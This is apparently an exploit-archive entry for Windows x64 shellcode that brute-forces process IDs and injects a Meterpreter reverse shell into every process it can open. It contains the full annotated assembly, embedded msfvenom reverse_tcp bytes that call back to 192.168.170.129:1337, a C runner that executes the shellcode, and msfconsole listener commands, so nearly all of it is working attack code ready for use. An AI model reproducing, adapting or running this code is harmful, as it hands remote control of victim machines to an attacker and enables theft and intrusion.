@@ -1,0 +1,389 @@
+id: 36180
+date: 05/03/2021
+title: Windows/x64 Inject All Processes With Meterpreter Reverse Shell Shellcode (655 bytes)
+author: Bobby Cooke
+cves: 
+
+# Shellcode Title:  Windows/x64 - Inject All Processes with Meterpreter Reverse Shell (655 Bytes)
+# Shellcode Author: Bobby Cooke (boku)
+# Tested on:        Windows 10 v2004 (x64)
+# Compiled from:    Kali Linux (x86_64)
+# Shellcode Description:
+#   64bit Windows 10 shellcode that injects all processes with Meterpreter reverse shells. The shellcode first resolves the base address of 
+#   kernel32.dll dynamically in memory via the Intel GS Register & host processes Process Environment Block (PEB). Then resolves the addresses 
+#   for the OpenProcess, VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread APIs via kernel32.dll's Export Table.
+#   Once all API's are resolved the shellcode then attempts to open a handle to other processes using the OpenProcess API via bruteforcing the PIDs.
+#   When a handle to a remote process is returned, the shellcode then attempts to allocate writable & executable memory in the remote process using the 
+#   VirtualAllocEx API. If successful, the shellcode will then use the WriteProcessMemory API to write the Meterpreter shellcode into the memory of the 
+#   remote process. To this point, if everything has returned sucessful, then the CreateRemoteThread API will be executed to create a thread in the remote
+#   process that will run the Meterpreter shell within that remote process. The shellcode then continues to bruteforce through more PIDs to launch more
+#   Meterpreter shells. 
+
+; Compile & get shellcode from Kali:
+;   nasm -f win64 x64win-InjectAllProcMeterpreterRevSh.asm -o x64win-InjectAllProcMeterpreterRevSh.o
+;   for i in $(objdump -D x64win-InjectAllProcMeterpreterRevSh.o | grep "^ " | cut -f2); do echo -n "\x$i" ; done
+; Get kernel32.dll base address
+xor rdi, rdi            ; RDI = 0x0
+mul rdi                 ; RAX&RDX =0x0
+mov rbx, gs:[rax+0x60]  ; RBX = Address_of_PEB
+mov rbx, [rbx+0x18]     ; RBX = Address_of_LDR
+mov rbx, [rbx+0x20]     ; RBX = 1st entry in InitOrderModuleList / ntdll.dll
+mov rbx, [rbx]          ; RBX = 2nd entry in InitOrderModuleList / kernelbase.dll
+mov rbx, [rbx]          ; RBX = 3rd entry in InitOrderModuleList / kernel32.dll
+mov rbx, [rbx+0x20]     ; RBX = &kernel32.dll ( Base Address of kernel32.dll)
+mov r8, rbx             ; RBX & R8 = &kernel32.dll
+
+; Get kernel32.dll ExportTable Address
+mov ebx, [rbx+0x3C]     ; RBX = Offset NewEXEHeader
+add rbx, r8             ; RBX = &kernel32.dll + Offset NewEXEHeader = &NewEXEHeader
+xor rcx, rcx            ; Avoid null bytes from mov edx,[rbx+0x88] by using rcx register to add
+add cx, 0x88ff
+shr rcx, 0x8            ; RCX = 0x88ff --> 0x88
+mov edx, [rbx+rcx]      ; EDX = [&NewEXEHeader + Offset RVA ExportTable] = RVA ExportTable
+add rdx, r8             ; RDX = &kernel32.dll + RVA ExportTable = &ExportTable
+
+; Get Number of Functions in Kernel32.dll ExportTable
+xor r9, r9 
+mov r9d, [rdx+0x14]     ; R9 = Number of Functions Kernel32.dll ExportTable
+
+; Get &AddressTable from Kernel32.dll ExportTable
+xor r10, r10
+mov r10d, [rdx+0x1C]    ; RDI = RVA AddressTable
+add r10, r8             ; R10 = &AddressTable
+
+; Get &NamePointerTable from Kernel32.dll ExportTable
+xor r11, r11
+mov r11d, [rdx+0x20]    ; R11 = [&ExportTable + Offset RVA Name PointerTable] = RVA NamePointerTable
+add r11, r8             ; R11 = &NamePointerTable (Memory Address of Kernel32.dll Export NamePointerTable)
+
+; Get &OrdinalTable from Kernel32.dll ExportTable
+xor r12, r12
+mov r12d, [rdx+0x24]    ; R12 = RVA  OrdinalTable
+add r12, r8             ; R12 = &OrdinalTable
+
+jmp short apis
+
+; Get the address of the API from the Kernel32.dll ExportTable
+getapiaddr:
+pop rbx                 ; save the return address for ret 2 caller after API address is found
+pop rcx                 ; Get the string length counter from stack
+xor rax, rax            ; Setup Counter for resolving the API Address after finding the name string
+mov rdx, rsp            ; RDX = Address of API Name String to match on the Stack 
+push rcx                ; push the string length counter to stack
+loop:
+mov rcx, [rsp]          ; reset the string length counter from the stack
+xor rdi,rdi             ; Clear RDI for setting up string name retrieval
+mov edi, [r11+rax*4]    ; EDI = RVA NameString = [&NamePointerTable + (Counter * 4)]
+add rdi, r8             ; RDI = &NameString    = RVA NameString + &kernel32.dll
+mov rsi, rdx            ; RSI = Address of API Name String to match on the Stack  (reset to start of string)
+repe cmpsb              ; Compare strings at RDI & RSI
+je resolveaddr          ; If match then we found the API string. Now we need to find the Address of the API 
+incloop:
+inc rax
+cmp rax, r9             ; Have we exhausted all APIs in the Export Table?
+jne loop
+
+; Find the address of GetProcAddress by using the last value of the Counter
+resolveaddr:
+pop rcx                 ; remove string length counter from top of stack
+mov ax, [r12+rax*2]     ; RAX = [&OrdinalTable + (Counter*2)] = ordinalNumber of kernel32.<API>
+mov eax, [r10+rax*4]    ; RAX = RVA API = [&AddressTable + API OrdinalNumber]
+add rax, r8             ; RAX = Kernel32.<API> = RVA kernel32.<API> + kernel32.dll BaseAddress
+push rbx                ; place the return address from the api string call back on the top of the stack
+ret                     ; return to API caller
+
+apis:                   ; API Names to resolve addresses
+; OpenProcess | String length : 11
+xor rcx, rcx
+add cl, 0xC                 ; String length for compare string 11(0xB)+NullByte = 0xC
+xor rax, rax
+add rax, 0x737365FF         ; sse,0xFF : 737365FF
+shr rax, 0x8                ; sse,0xFF --> 0x00,sse 
+push rax
+mov rax, 0x636f72506e65704f ; corPnepO : 636f72506e65704f
+push rax
+push rcx                    ; push the string length counter to stack
+call getapiaddr             ; Get the address of the API from Kerenl32.dll ExportTable
+mov r13, rax                ; R13 = &OpenProcess
+
+; VirtualAllocEx | String length : 14
+xor rcx, rcx
+add cl, 0xF                 ; String length for compare string 14(0xE)+NullByte = 0xF
+mov rax, 0x7845636F6C6CFFFF ; xEcoll,0xFFFF : 7845636f6c6cFFFF
+shr rax, 0x10               ; xEcoll,0xFFFF --> 0x0000,xEcoll
+push rax
+mov rax, 0x416c617574726956 ; AlautriV : 416c617574726956
+push rax
+push rcx                    ; push the string length counter to stack
+call getapiaddr             ; Get the address of the API from Kerenl32.dll ExportTable
+mov r14, rax                ; R14 = &VirtualAllocEx
+
+; WriteProcessMemory | String length : 18
+xor rcx, rcx
+push rcx
+add cl, 0x9                 ; String length for compare string
+mov rax, 0x6f6d654d73736563 ; omeMssec : 6f6d654d73736563
+push rax
+mov rax, 0x6f72506574697257 ; orPetirW : 6f72506574697257
+push rax
+push rcx                    ; push the string length counter to stack
+call getapiaddr             ; Get the address of the API from Kerenl32.dll ExportTable
+mov r15, rax                ; R15 = &WriteProcessMemory 
+
+; CreateRemoteThread | String length : 18
+xor rcx, rcx
+push rcx
+add cl, 0x7                 ; String length for compare string 
+mov rax, 0x6552657461657243 ; eRetaerC : 6552657461657243
+push rax
+push rcx                    ; push the string length counter to stack
+call getapiaddr             ; Get the address of the API from Kerenl32.dll ExportTable
+mov r12, rax                ; R12 = &CreateRemoteThread 
+
+; R11 = Handle Counter | R12 = &CreateRemoteThread | R13 = &OpenProcess | R14 = &VirtualAllocEx | R15 = &WriteProcessMemory
+save2stack:
+push r12
+push r13
+push r14
+push r15
+jmp short loopinit
+
+getAddrFromStack:
+pop rcx             ; pop ret address
+pop r11
+mov r15, [rsp]
+mov r14, [rsp+0x8]
+mov r13, [rsp+0x10]
+mov r12, [rsp+0x18]
+push rcx
+ret
+
+loopinit:
+xor r11, r11
+add r11, 0xFA0 ; PID-1 - Start at PID 4000
+
+hprocloop:
+inc r11     ; Increment the PID Loop counter by 1 and try to open another handle
+push r11
+
+; hProc = OpenProcess(PROCESS_ALL_ACCESS, false, i);
+;        HANDLE OpenProcess(         
+;         DWORD dwDesiredAccess,   =>  RCX = 0x1FFFFF = PROCESS_ALL_ACCESS
+;         BOOL bInheritHandle,     =>  RDX = 0x0 = false
+;         DWORD dwProcessId        =>  R8  = ProcessID (PID of target process to inject too)
+; );
+sub rsp, 0x40         ; Allocate 0x28 (40) bytes on the stack
+xor rcx, rcx
+add rcx, 0x1FFFFFFF ; RCX = 0x1FFFFFFF
+shr rcx, 0x8        ; RCX = 0x1FFFFFFF --> 0x001FFFFF = PROCESS_ALL_ACCESS
+xor rdx, rdx        ; RDX = 0x0 = false
+xor r8,r8
+mov r8, r11         ; R8  = ProcessID (PID of target process to inject too)
+call r13            ; RAX will return the Process Handle for the opened remote process
+add rsp, 0x40       ; clean up stack
+call getAddrFromStack ; reset API addresses in registers
+xor rdx, rdx        ; RDX = Returned Null? (Could not Open a handle to remote process)
+cmp rax, rdx
+je hprocloop        ; Failed to get a handle to remote process, increment ProcessID by 1 and try again
+push r11            ; push counter to stack to avoid clobber
+push rax            ; Save hProcess handle to stack - R10 & RAX & RCX get clobbered by VirtualAllocEx()
+
+; remoteProcAddr = VirtualAllocEx(hProc, 0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+; LPVOID VirtualAllocEx(
+;        HANDLE hProcess,          => RCX = Process Handle returned from OpenProcess()
+;        LPVOID lpAddress,         => RDX = 0x0 - Will allow kernel to allocate the dest memory addr in remote process
+;        SIZE_T dwSize,            => R8  = 0x1000 - Memory size to allocate
+;        DWORD flAllocationType,   => R9  = 0x3000 => MEM_RESERVE
+;        DWORD flProtect           => [RSP+0x20] = 0x40 => PAGE_EXECUTE_READWRITE - Makes the memory buffer in remote process Read&Write&Executable (Required for DEP)
+; );
+sub rsp, 0x40         ; Allocate 0x28 (40) bytes on the stack
+mov rcx, rax         ; RCX = HANDLE hProcess
+xor rdx, rdx         ; RDX = 0x0 = lpAddress
+xor r8, r8  
+xor rbx, rbx
+add bx, 0x10FF
+shr rbx, 0x8         ; 0x10FF --> 0x10
+shl rbx, 0x8         ; 0x10   --> 0x1000
+add r8, rbx          ; R8 = dwSize
+xor r9, r9
+xor rbx, rbx
+add bx, 0x30FF
+shr rbx, 0x8         ; 0x30FF --> 0x30
+shl rbx, 0x8         ; 0x30   --> 0x3000
+add r9, rbx          ; R9 = flAllocationType
+xor rbx, rbx
+add bx, 0x40FF
+shr rbx, 0x8         ; 0x40FF --> 0x40
+mov [rsp+0x20], rbx  ; [RSP=0x20] = flProtect
+call r14             ; If success, RAX = Address of allocated memory in remote process
+add rsp, 0x40        ; clean up stack
+pop r10              ; get open handle to remote process from stack
+call getAddrFromStack ; reset API addresses in registers
+xor rdx, rdx         ; RDX = Returned Null? (Could allocate memory in remote process)
+cmp rax, rdx
+je hprocloop         ; Failed to allocate memory in remote process, increment ProcessID by 1 and try again
+push r11
+push rax             ; Save remoteProcAddr to stack
+push r10             ; Save hProcess handle to stack - R10 & RAX & RCX get clobbered by VirtualAllocEx()
+
+; n = WriteProcessMemory(hProc, remoteProcAddr, payload, payload_len, NULL);
+; BOOL WriteProcessMemory(
+;        HANDLE hProcess,                  => RCX = Process Handle returned from OpenProcess()
+;        LPVOID lpBaseAddress,             => RDX = Memory address in remote process returned from VirtualAllocEx()
+;        LPCVOID lpBuffer,                 => R8  = Memory address in host process of the shellcode that will be injected into remote process 
+;        SIZE_T nSize,                     => R9  = 0x1000 - Memory size to allocate
+;        SIZE_T *lpNumberOfBytesWritten    => [RSP+0x20] = 0x0 - Have to place 5th+ values on stack. Need to leave 32 bytes for "Shadow Space" 0x20=32bytes
+; );
+sub rsp, 0x40         ; Allocate 0x28 (40) bytes on the stack
+mov rcx, r10         ; RCX = HANDLE hProcess
+mov rdx, rax         ; RDX = lpBaseAddress
+jmp short callPayload
+popPayload:
+pop r8 ; r8 = local shellcode payload address
+xor rbx, rbx
+add bx, 0x10FF
+shr rbx, 0x8         ; 0x10FF --> 0x10
+shl rbx, 0x8         ; 0x10   --> 0x1000
+mov r9, rbx          ; R9 = nSize
+xor rbx, rbx
+mov [rsp+0x20], rbx  ; [RSP=0x20] = *lpNumberOfBytesWritten
+call r15             ; if success will return True (1) else False (0) = fail
+add rsp, 0x40        ; clean up stack
+pop r10              ; get Process Handle from stack
+pop r9               ; R9 = remoteProcAddr
+call getAddrFromStack ; reset API addresses in registers
+xor rdx, rdx        ; RDX = Returned Null? (Could write memory in remote process)
+cmp rax, rdx
+je hprocloop        ; Failed to write memory in remote process, increment ProcessID by 1 and try again
+
+; CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remoteProcAddr, NULL, NULL, NULL);
+; HANDLE CreateRemoteThread(
+;        HANDLE hProcess,                          => RCX = Process Handle returned from OpenProcess()
+;        LPSECURITY_ATTRIBUTES lpThreadAttributes, => RDX = 0x0
+;        SIZE_T dwStackSize,                       => R8  = 0x0
+;        LPTHREAD_START_ROUTINE lpStartAddress,    => R9  = remoteProcAddr  
+;        LPVOID lpParameter,                       => [RSP+0x20] = 0x0
+;        DWORD dwCreationFlags,                    => [RSP+0x28] = 0x0
+;        LPDWORD lpThreadId                        => [RSP+0x30] = 0x0
+; );
+push r11
+sub rsp, 0x40         ; Allocate 0x28 (40) bytes on the stack
+mov rcx, r10       ; RCX = HANDLE hProcess
+xor rdx, rdx       ; RDX = lpThreadAttributes
+xor r8, r8         ; R8  = dwStackSize
+                   ; R9  = remoteProcAddr
+mov [rsp+0x20], r8 ; lpParameter
+mov [rsp+0x28], r8 ; dwCreationFlag
+mov [rsp+0x30], r8 ; lpThreadId
+call r12           ; Call CreateRemoteThread()
+add rsp, 0x40      ; clean up stack
+call getAddrFromStack ; reset API addresses in registers
+xor rax,rax
+xor rdx,rdx
+je hprocloop       ; Do the process injection again on more processes
+
+callPayload:
+call popPayload
+; nopsled
+db  0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90
+payload:
+; msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.170.129 LPORT=1337 EXITFUNC=thread -f csharp
+; Payload size: 511 bytes
+db  0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,\
+    0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,\
+    0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,\
+    0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,\
+    0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,\
+    0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,\
+    0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x8b,0x48,\
+    0x18,0x50,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x4d,0x31,0xc9,0x48,\
+    0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,\
+    0x0d,0xac,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,\
+    0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,\
+    0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x41,0x58,\
+    0x41,0x58,0x5e,0x59,0x48,0x01,0xd0,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,\
+    0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,\
+    0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,0x00,\
+    0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5,\
+    0x49,0xbc,0x02,0x00,0x05,0x39,0xc0,0xa8,0xaa,0x81,0x41,0x54,0x49,0x89,0xe4,\
+    0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,\
+    0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,\
+    0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,\
+    0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,\
+    0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,\
+    0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,0xce,0x75,0xe5,\
+    0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9,\
+    0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,\
+    0x83,0xf8,0x00,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,\
+    0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41,\
+    0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31,\
+    0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,\
+    0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40,\
+    0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,0x30,0xff,0xd5,\
+    0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x49,0xff,0xce,0xe9,0x3c,\
+    0xff,0xff,0xff,0x48,0x01,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,\
+    0xff,0xe7,0x58,0x6a,0x00,0x59,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,\
+    0xd5
+; nopsled
+db  0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90
+
+###############################################################################################################
+
+// shellcode-CppRunner.c
+// Cross-Compiled from x64 Kali with mingw
+// x86_64-w64-mingw32-gcc shellcode-cppRunner.c -o shellcode-cppRunner.exe
+// ^ Now transfer the EXE to the target windows host, execute it, and  have this shellcode runner do its thing for a demo
+// - Make sure to start the multi/handler on your MSFConsole to catch the meterpreter reverse shells
+//   msfconsole; msf6 > use multi/handler; msf6 > set payload windows/x64/meterpreter/reverse_tcp; msf6 > set lhost 192.168.170.129; msf6 > set lport 1337; run
+//   ^ Replace the msfvenom code below, and mod the msfconsole commands to your lhost and lport & mod payload_len var below if your met shell in not == 511 bytes
+
+#include <windows.h>
+#include <stdlib.h>
+
+unsigned char scode[] =
+// The Process injector shellcode that dynamically resolves the APIs and injects all processes on the target that it can get a handle too
+"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b\x5b\x3c\x4c\x01\xc3\x48\x31"
+"\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xc9\x44\x8b\x4a\x14\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2\x4d\x31\xdb\x44\x8b\x5a\x20"
+"\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x35\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89"
+"\xd6\xf3\xa6\x74\x08\x48\xff\xc0\x4c\x39\xc8\x75\xe3\x59\x66\x41\x8b\x04\x44\x41\x8b\x04\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x0c\x48\x31\xc0\x48\x05\xff"
+"\x65\x73\x73\x48\xc1\xe8\x08\x50\x48\xb8\x4f\x70\x65\x6e\x50\x72\x6f\x63\x50\x51\xe8\xa6\xff\xff\xff\x49\x89\xc5\x48\x31\xc9\x80\xc1\x0f\x48\xb8\xff\xff\x6c\x6c"
+"\x6f\x63\x45\x78\x48\xc1\xe8\x10\x50\x48\xb8\x56\x69\x72\x74\x75\x61\x6c\x41\x50\x51\xe8\x7d\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x51\x80\xc1\x09\x48\xb8\x63\x65"
+"\x73\x73\x4d\x65\x6d\x6f\x50\x48\xb8\x57\x72\x69\x74\x65\x50\x72\x6f\x50\x51\xe8\x57\xff\xff\xff\x49\x89\xc7\x48\x31\xc9\x51\x80\xc1\x07\x48\xb8\x43\x72\x65\x61"
+"\x74\x65\x52\x65\x50\x51\xe8\x3c\xff\xff\xff\x49\x89\xc4\x41\x54\x41\x55\x41\x56\x41\x57\xeb\x18\x59\x41\x5b\x4c\x8b\x3c\x24\x4c\x8b\x74\x24\x08\x4c\x8b\x6c\x24"
+"\x10\x4c\x8b\x64\x24\x18\x51\xc3\x4d\x31\xdb\x49\x81\xc3\xa0\x0f\x00\x00\x49\xff\xc3\x41\x53\x48\x83\xec\x40\x48\x31\xc9\x48\x81\xc1\xff\xff\xff\x1f\x48\xc1\xe9"
+"\x08\x48\x31\xd2\x4d\x31\xc0\x4d\x89\xd8\x41\xff\xd5\x48\x83\xc4\x40\xe8\xb2\xff\xff\xff\x48\x31\xd2\x48\x39\xd0\x74\xcc\x41\x53\x50\x48\x83\xec\x40\x48\x89\xc1"
+"\x48\x31\xd2\x4d\x31\xc0\x48\x31\xdb\x66\x81\xc3\xff\x10\x48\xc1\xeb\x08\x48\xc1\xe3\x08\x49\x01\xd8\x4d\x31\xc9\x48\x31\xdb\x66\x81\xc3\xff\x30\x48\xc1\xeb\x08"
+"\x48\xc1\xe3\x08\x49\x01\xd9\x48\x31\xdb\x66\x81\xc3\xff\x40\x48\xc1\xeb\x08\x48\x89\x5c\x24\x20\x41\xff\xd6\x48\x83\xc4\x40\x41\x5a\xe8\x52\xff\xff\xff\x48\x31"
+"\xd2\x48\x39\xd0\x0f\x84\x68\xff\xff\xff\x41\x53\x50\x41\x52\x48\x83\xec\x40\x4c\x89\xd1\x48\x89\xc2\xeb\x6f\x41\x58\x48\x31\xdb\x66\x81\xc3\xff\x10\x48\xc1\xeb"
+"\x08\x48\xc1\xe3\x08\x49\x89\xd9\x48\x31\xdb\x48\x89\x5c\x24\x20\x41\xff\xd7\x48\x83\xc4\x40\x41\x5a\x41\x59\xe8\x08\xff\xff\xff\x48\x31\xd2\x48\x39\xd0\x0f\x84"
+"\x1e\xff\xff\xff\x41\x53\x48\x83\xec\x40\x4c\x89\xd1\x48\x31\xd2\x4d\x31\xc0\x4c\x89\x44\x24\x20\x4c\x89\x44\x24\x28\x4c\x89\x44\x24\x30\x41\xff\xd4\x48\x83\xc4"
+"\x40\xe8\xd2\xfe\xff\xff\x48\x31\xc0\x48\x31\xd2\x0f\x84\xe8\xfe\xff\xff\xe8\x8c\xff\xff\xff\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+// To inject all processes on the target running this shellcode with your own Meterpreter Reverse shell (with your own IP), use msfvenom and replace below
+// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.170.129 LPORT=1337 EXITFUNC=thread -f c
+"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a"
+"\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18"
+"\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x8b\x48\x18\x50\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x4d\x31\xc9\x48\xff"
+"\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01"
+"\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x41\x58\x5e\x59\x48\x01\xd0\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff"
+"\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5\x49"
+"\xbc\x02\x00\x05\x39\xc0\xa8\xaa\x81\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00"
+"\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41"
+"\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a"
+"\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2"
+"\x48\x31\xc9\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
+"\x7d\x28\x58\x41\x57\x59\x68\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c\xff"
+"\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\xbb\xe0\x1d\x2a\x0a\x41\x89\xda\xff\xd5\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90";
+
+unsigned int payload_len = 1166;
+
+int main(int argc, char** argv)
+{
+    DWORD oldprotect = 0;
+    void* exec = VirtualAlloc(0, payload_len, MEM_COMMIT, PAGE_READWRITE);
+    memcpy(exec, scode, payload_len);
+    auto vp = VirtualProtect(exec, payload_len, PAGE_EXECUTE_READ, &oldprotect);
+    ((void(*)())exec)();
+}
+
+#  0day.today [2023-03-22]  #
